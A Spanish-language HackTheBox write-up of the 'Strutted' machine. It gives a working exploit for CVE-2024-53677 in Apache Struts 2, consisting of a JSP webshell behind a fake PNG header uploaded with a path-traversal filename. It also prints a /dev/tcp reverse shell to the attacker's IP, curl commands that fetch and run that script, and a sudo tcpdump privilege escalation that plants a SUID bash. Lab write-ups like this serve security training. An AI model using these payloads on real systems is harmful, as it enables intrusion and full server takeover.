---
title: "Strutted — MEDIUM"
date: 2025-11-15 00:00:00 -0700
categories: [Writeups, HTB]
tags: [HTB, strutted, apache, struts2, cve-2024-53677, rce, tcpdump]
image: /assets/img/strutted/Strutted-HTB.png
toc: true
comments: true
description: "Writeup técnico paso a paso de 'Strutted' (HTB): explotación del CVE-2024-53677 en Apache Struts 2 mediante manipulación de multipart/form-data, obtención de RCE en Tomcat, movimiento lateral con credenciales encontradas y escalada de privilegios con tcpdump."
---

# 🚀 Strutted — MEDIUM

📅 **Fecha:** 08-11-2025  
🔗 **IP objetivo:** `10.10.11.59`  
🔍 **Estado:** 🎯 Resuelta  
👤 **Autor:** Roberto  

---

## TL;DR

Una app basada en **Apache Struts 2** era vulnerable al **CVE-2024-53677**, que permite subir un archivo JSP malicioso modificando parámetros del `FileUploadInterceptor`.  
Mediante una cabecera PNG falsa y un `multipart/form-data` manipulado, se consiguió **RCE** como usuario `tomcat`.  
Luego se encontraron credenciales en `tomcat-users.xml`, se accedió por **SSH como james**, y finalmente se obtuvo **root** mediante un abuso del binario `tcpdump` en `sudo` con NOPASSWD.

---

## Reconocimiento

Comenzamos con un escaneo completo para identificar servicios y versiones:

```bash
╭─kali@kali ~/strutted/nmap at 🕐 17:15
╰─❯ nmap  -p- -sCV -A --min-rate 5000 -Pn -n -oN escan.txt 10.10.11.59
Nmap scan report for 10.10.11.59
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://strutted.htb/
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Notamos que hay 2 servicios, http y ssh, modificaremos el /etc/host

```bash
╭─kali@kali ~/strutted/nmap at 🕐 17:15
╰─❯ echo "10.10.X.X strutted.htb" | sudo tee -a /etc/hosts
```

![page](/assets/img/strutted/page.png)

## Descarga y análisis del código

En la web hay un enlace para descargar un ZIP del proyecto (Docker + código). Descomprimí y revisé el contenido:

```bash
╭─kali@kali ~/Downloads/strutted at 🕐 17:19
╰─❯ ls
mvnw  mvnw.cmd  pom.xml  src  target
```
Dentro encontré `tomcat-users.xml` y `Dockerfile`, lo que nos interesa porque revela cómo se despliega la aplicación y (a veces) credenciales en claro:

![tomcat-users](/assets/img/strutted/tomcat-users.png)

![dockerfile](/assets/img/strutted/dockerfile.png)

En este caso el `Dockerfile` copia `tomcat-users.xml` al contenedor, por lo que es un _indicio fuerte_ de que hay credenciales que podremos usar luego.

## Vulnerabilidad — CVE-2024-53677 (Apache Struts 2)

La aplicación usa **Apache Struts 2**. La vulnerabilidad explotada es **CVE-2024-53677**: un fallo en el manejo de subidas de archivos por el `FileUploadInterceptor` que permite, mediante OGNL y parámetros maliciosos, cambiar la propiedad que decide el nombre/destino final del fichero subido.


- El campo que crea el objeto de upload debe llamarse exactamente `Upload` (con U mayúscula).

- Si envías después `top.UploadFileName=../../shell.jsp` en el mismo multipart/form-data, Struts acepta ese value y mueve el archivo fuera de `/uploads` hacia donde le indicas (path traversal).

- Si ese archivo contiene código JSP y queda en el webroot, Tomcat lo ejecutará → **RCE**.

`Importante`: muchas protecciones solo verifican el _tipo_ de archivo — por eso el payload debe **comenzar con bytes válidos de imagen** y luego contener el JSP.

Creamos un `payload.png` que comience con cabecera PNG válida y contenga un webshell JSP. Esto ayuda a pasar la validación “Only image files” del servidor.

```bash
╭─kali@kali ~/Downloads/strutted at 🕐 17:19
╰─❯ printf '\x89PNG\r\n\x1a\n' > payload.png
cat >> payload.png <<'EOF'
<%@ page import="java.io.*" %>
<%
if("cmd".equals(request.getParameter("action"))){
  String cmd = request.getParameter("cmd");
  Process p = Runtime.getRuntime().exec(cmd);
  InputStream in = p.getInputStream();
  int c;
  while((c=in.read())!=-1) out.print((char)c);
}
%>
EOF
```

la cabecera PNG (`\x89PNG\r\n\x1a\n`) hace que el servidor crea que es una imagen; lo siguiente es el JSP que permite ejecutar comandos vía `?action=cmd&cmd=...`.

El campo `Upload` debe ir **antes** que `top.UploadFileName` en el multipart. Si no, la inyección no surte efecto.

## Subida del payload

```bash
╭─kali@kali ~/Downloads/strutted at 🕐 17:19
╰─❯ curl -v "http://strutted.htb/upload.action" \
  -F "Upload=@payload.png;type=image/png" \
  -F "top.UploadFileName=../../shell.jsp"
```

Si prefieres Burp: intercepta la subida normal, edita el body multipart para que el primer form-data sea `Upload` (con el contenido de `payload.png`) y añade la parte `top.UploadFileName` con `../../shell.jsp` después. Envía y observa la respuesta.

Al subir correctamente, la página muestra algo como (captura):

![Curl-up](/assets/img/strutted/curl-Up.png)

Notarás que en la página se refiere a `uploads/.../../../shell.jsp` — eso confirma que el servidor procesó la asignación y movió el archivo.

Comprobación rápida con curl:

```bash
╭─kali@kali ~/Downloads/strutted at 🕐 17:19
╰─❯ curl -s "http://strutted.htb/shell.jsp?action=cmd&cmd=id"
```

Salida esperada

```bash
uid=998(tomcat) gid=998(tomcat) groups=998(tomcat)
```

En lugar de depender de la JSP que solo muestra salida, la práctica segura es usar un script `shell.sh` en tu Kali y hacer que el target lo descargue y lo ejecute. Yo usé pwncat pero funcionan `nc` o `metasploit`.

## Reverse shell

```bash
╭─kali@kali ~/Downloads/strutted at 🕐 17:19
╰─❯ cat > /tmp/shell.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.170/4444 0>&1
EOF

chmod +x /tmp/shell.sh

# servir por HTTP
cd /tmp && python3 -m http.server 80
# en otra terminal:
pwncat -l 4444 -v
```

Y para la JSP

```bash
curl -s "http://strutted.htb/shell.jsp?action=cmd&cmd=curl%20-O%20http://10.10.14.170/shell.sh"

curl -s "http://strutted.htb/shell.jsp?action=cmd&cmd=chmod%20%2Bx%20shell.sh"

curl -s "http://strutted.htb/shell.jsp?action=cmd&cmd=./shell.sh"
```

Después de esto obtendrás una sesión interactiva (pwncat) como `tomcat`. Captura de la conexión:

![sesion](/assets/img/strutted/sesion.png)

## Enumeración interna

Una vez conseguida la shell, lo primero es comprobar `passwd` y usuarios:

![passwd](/assets/img/strutted/passwd.png)

Revisé la estructura de Tomcat y encontré el archivo `tomcat-users.xml`. Ese archivo **contenía credenciales** útiles (o la copia en el Docker descargado también lo mostraba), así que anoté la contraseña del usuario aplicable.

![data](/assets/img/strutted/data.png)

Con la contraseña encontrada intenté SSH desde mi Kali


```bash
╭─kali@kali ~ via 🐍 v3.13.7  at 🕐 16:58
╰─❯ ssh james@strutted.htb   
```

Una vez dentro como `james` pude leer `user.txt`:

```bash
james@strutted:~$ ls
user.txt
james@strutted:~$ cat user.txt 
************************ad39
james@strutted:~$ 
```
## Escalada de privilegios

¿qué puede ejecutar `james`?

Comprobé `sudo -l` y vi esto:

```bash
james@strutted:~$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
james@strutted:~$ 
```

Esto es perfecto para la escalada, porque `tcpdump` en muchas versiones tiene la opción `-z` (run a script on rotation) y la opción `-Z` para cambiar el usuario de ejecución — combinadas nos permiten ejecutar un script **como root**.

En GTFOBINS nos encontramos con este binario explotable

![bin](/assets/img/strutted/GTFOBINS.png)

**Idea**: crear un script que, cuando lo ejecute root, copie `/bin/bash` a `/tmp` y le ponga el bit SUID. Después ejecutamos esa copia con `-p` para mantener privilegios y obtener root shell.


```bash
james@strutted:~$ echo 'cp /bin/bash /tmp/bash_root && chmod 6777 /tmp/bash_root' > /tmp/rot.sh
james@strutted:~$ chmod +x /tmp/rot.sh
james@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/rot.sh -Z root
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel
james@strutted:~$ ls -l /tmp/bash_root
-rwsrwsrwx 1 root root 1396520 Nov 10 22:05 /tmp/bash_root
james@strutted:~$ /tmp/bash_root -p
bash_root-5.1# id
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),27(sudo),1000(james)
bash_root-5.1# cat /root/root.txt
************************a3fe
bash_root-5.1# 
```

## Explicacion - Resumen

Que es lo que sucede

Esta máquina explota una vulnerabilidad reciente y real — **CVE-2024-53677** — en **Apache Struts 2**, que afecta a la clase `FileUploadInterceptor`.  
En pocas palabras: Struts permite subir archivos con campos multipart/form-data. El problema es que el parámetro `UploadFileName` puede manipularse mediante OGNL (Object-Graph Navigation Language) para cambiar la ruta de guardado del archivo.  

Si el atacante usa un campo llamado exactamente **`Upload`** y luego envía **`top.UploadFileName=../../shell.jsp`**, el servidor reescribe el destino y guarda el archivo fuera del directorio seguro de `/uploads/`, permitiendo colocarlo directamente en el **webroot** de la aplicación.

Esto abre la puerta a subir un archivo JSP malicioso (un _webshell_) que luego se puede ejecutar desde el navegador, logrando **ejecución remota de comandos (RCE)** en el servidor.

Como el servidor está desplegado en **Tomcat**, y los archivos JSP se ejecutan como scripts Java, cualquier código dentro del JSP se procesa del lado del servidor. 

La restricción “Only image files can be uploaded” se evita agregando la **cabecera PNG** al inicio del archivo (lo que engaña al validador del tipo de contenido).

Una vez obtenida una shell con el usuario **tomcat**, se puede enumerar el sistema. En este caso, los archivos de configuración (`tomcat-users.xml`) contenían **credenciales reutilizadas**, lo que permitió moverse lateralmente al usuario **james**, que sí tenía un shell y acceso por SSH.

Ya como `james`, el comando `sudo -l` reveló que podía ejecutar `tcpdump` como root sin contraseña.  
Esto es crítico, porque `tcpdump` tiene la opción **`-z`**, que ejecuta un script después de rotar un archivo de captura, y la opción **`-Z root`**, que define el usuario con el que se ejecuta.  

En combinación, esto permite correr un script arbitrario **como root**.  

El exploit más simple consiste en copiar `/bin/bash` a `/tmp`, darle permisos `6777` (SUID), y luego ejecutarla con la opción `-p`, lo que conserva los privilegios root.

```bash
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/rot.sh -Z root
```

De esa forma, al rotar el “archivo de captura”, el script `/tmp/rot.sh` se ejecuta con privilegios máximos, creando la copia SUID de `bash`.  
Esa copia (`/tmp/bash_root`) luego permite abrir una shell persistente como **root**, sin necesidad de volver a usar `tcpdump`.

Finalmente, desde esa shell privilegiada se pueden leer los archivos de bandera `user.txt` y `root.txt`, completando la máquina.

Happy hacking :)
